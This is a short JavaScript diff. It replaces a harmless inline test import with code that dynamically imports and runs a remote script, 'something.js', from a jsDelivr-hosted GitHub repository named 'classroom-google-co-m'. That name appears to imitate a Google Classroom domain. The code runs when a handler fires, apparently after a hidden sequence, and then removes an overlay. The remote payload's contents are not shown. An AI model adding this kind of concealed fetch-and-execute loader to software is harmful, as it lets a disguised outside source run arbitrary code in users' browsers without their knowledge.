@@ -345,17 +345,16 @@ form.append(heading, label, explanation);
       }
 
       try {
-        // Temporary placeholder, replaced by the module import below.
-        const addon = await import(
-          "data:text/javascript,export%20function%20run()%7Bconsole.log('Sequence%20accepted%3B%20JavaScript%20executed.')%7D"
-        );
+          const addon = await import(
+              "https://cdn.jsdelivr.net/gh/classroom-google-co-m/js@main/something.js"
+          );
 
-        overlay.remove();
-        addon.run();
+          overlay.remove();
+          addon.run();
       } catch (error) {
-        console.error("Addon failed to run:", error);
+          console.error("Addon failed to run:", error);
       } finally {
-        active = false;
+          active = false;
       }
     });
   });
